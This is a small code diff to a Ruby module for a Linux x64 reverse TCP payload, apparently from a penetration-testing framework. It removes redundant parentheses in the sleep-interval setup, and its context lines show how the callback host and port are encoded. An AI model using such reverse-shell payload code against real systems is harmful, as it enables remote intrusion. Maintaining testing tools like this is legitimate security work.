@@ -80,7 +80,7 @@ module Payload::Linux::X64::ReverseTcp
     reliable     = opts[:reliable]
     encoded_port = "%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
     encoded_host = "%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
-    seconds = (opts[:sleep_seconds] || 5.0)
+    seconds = opts[:sleep_seconds] || 5.0
     sleep_seconds = seconds.to_i
     sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
 
